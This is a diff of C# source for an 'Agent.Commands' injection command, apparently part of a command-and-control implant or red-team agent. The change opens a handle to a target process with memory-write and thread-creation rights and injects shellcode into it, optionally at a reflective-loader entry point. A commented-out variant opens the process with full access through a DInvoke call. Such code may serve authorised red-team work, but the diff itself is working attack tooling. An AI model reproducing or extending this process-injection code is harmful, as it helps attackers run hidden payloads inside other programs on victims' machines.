@@ -10,6 +10,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using WinAPI;
+using WinAPI.Data.Kernel32;
 using WinAPI.Wrapper;
 
 namespace Agent.Commands
@@ -27,10 +28,25 @@ namespace Agent.Commands
 
             int processId = task.GetParameter<int>(ParameterId.Id);
 
-            var process = Process.GetProcessById(processId);
-            if (process == null)
+            //var process = Process.GetProcessById(processId);
+            //if (process == null)
+            //{
+            //    context.AppendResult($"Unable to find process with Id {processId}");
+            //    return;
+            //}
+
+            IntPtr hProcess = APIWrapper.OpenProcess(processId, ProcessAccessFlags.PROCESS_VM_WRITE |
+    ProcessAccessFlags.PROCESS_VM_OPERATION |
+    ProcessAccessFlags.PROCESS_CREATE_THREAD);
+            // OUVRIR UN NOUVEAU HANDLE AVEC LES BONS DROITS
+            //IntPtr hProcess = WinAPI.DInvoke.Kernel32.NtOpenProcess(
+            //    (uint)processId,
+            //    ProcessAccessFlags.PROCESS_ALL_ACCESS
+            //);
+
+            if (hProcess == IntPtr.Zero)
             {
-                context.AppendResult($"Unable to find process with Id {processId}");
+                context.Error($"Failed to open process with sufficient rights. Error: {Marshal.GetLastWin32Error()}");
                 return;
             }
 
@@ -42,7 +58,7 @@ namespace Agent.Commands
                     var entryPointFunctionName = task.GetParameter<string>(ParameterId.Name);
                     shellCodeOffset = WinAPI.Helper.ReflectiveLoaderHelper.GetReflectiveFunctionOffset(shellcode, entryPointFunctionName);
                 }
-                APIWrapper.Inject(process.Handle, IntPtr.Zero, shellcode, shellCodeOffset, context.ConfigService.APIInjectionMethod);
+                APIWrapper.Inject(hProcess, IntPtr.Zero, shellcode, shellCodeOffset, context.ConfigService.APIInjectionMethod);
 
                 context.AppendResult($"Injection succeed.");
             }
